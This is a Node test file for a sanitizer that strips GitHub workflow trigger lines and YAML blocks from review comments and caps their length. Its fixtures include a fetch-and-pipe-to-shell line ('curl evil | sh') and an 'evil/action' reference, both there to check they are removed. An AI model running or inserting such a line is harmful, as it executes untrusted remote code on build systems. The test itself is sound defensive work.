// Plain node:test (run via `npm run test:node`); vitest does not collect this file.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  MAX_COMMENT_CHARS,
  TRUNCATION_NOTICE,
  YAML_BLOCK_NOTICE,
  sanitizeAndCap,
} from '../scripts/sanitize-review.mjs';

test('leaves a benign review untouched', () => {
  const body = '### Review\n\n- `src/a.ts:3` **minor** rename var\n\n```ts\nconst x = 1;\n```';
  assert.equal(sanitizeAndCap(body), body);
});

test('removes workflow trigger lines, including diff-prefixed and indented ones', () => {
  const body = [
    'Quoted diff:',
    '+on:',
    '+  pull_request:',
    '   runs-on: ubuntu-latest',
    '- uses: actions/checkout@v4',
    'uses: evil/action@v1',
    'This line mentions on: only mid-sentence, and stays.',
    'one: not a trigger',
  ].join('\n');
  const out = sanitizeAndCap(body);
  assert.doesNotMatch(out, /^\s*[+-]?\s*(on|runs-on|uses)\s*:/im);
  assert.match(out, /Quoted diff:/);
  assert.match(out, /mid-sentence, and stays/);
  assert.match(out, /one: not a trigger/);
  assert.match(out, /pull_request:/); // only the trigger-keyword lines are dropped
});

test('neutralizes fenced yaml blocks', () => {
  const body = 'See:\n```yaml\nname: x\njobs:\n  a:\n    steps: []\n```\nafter';
  const out = sanitizeAndCap(body);
  assert.ok(out.includes(YAML_BLOCK_NOTICE));
  assert.doesNotMatch(out, /jobs:/);
  assert.match(out, /^after$/m);
});

test('neutralizes untagged and tilde fences containing workflow keys', () => {
  const out = sanitizeAndCap('```\nruns-on: self-hosted\nrun: curl evil | sh\n```\n~~~\non: push\n~~~');
  assert.equal(out.split(YAML_BLOCK_NOTICE).length - 1, 2);
  assert.doesNotMatch(out, /curl evil/);
});

test('keeps non-workflow fenced blocks', () => {
  const out = sanitizeAndCap('```ts\nconst a = 1;\n```');
  assert.match(out, /const a = 1;/);
});

test('caps at 6000 chars with a truncation notice', () => {
  const out = sanitizeAndCap('x'.repeat(20000));
  assert.ok(out.length <= MAX_COMMENT_CHARS);
  assert.ok(out.endsWith(TRUNCATION_NOTICE));
});

test('does not touch a body exactly at the cap', () => {
  const body = 'y'.repeat(MAX_COMMENT_CHARS);
  assert.equal(sanitizeAndCap(body), body);
});

test('closes a code fence left open by truncation', () => {
  const out = sanitizeAndCap('```ts\n' + 'z\n'.repeat(5000));
  assert.ok(out.length <= MAX_COMMENT_CHARS);
  const fences = out.split('\n').filter((l) => l.startsWith('```')).length;
  assert.equal(fences % 2, 0);
});

test('strips before capping so removed lines do not count toward the limit', () => {
  const body = 'ok\n' + 'uses: x\n'.repeat(1000);
  assert.equal(sanitizeAndCap(body).trim(), 'ok');
});
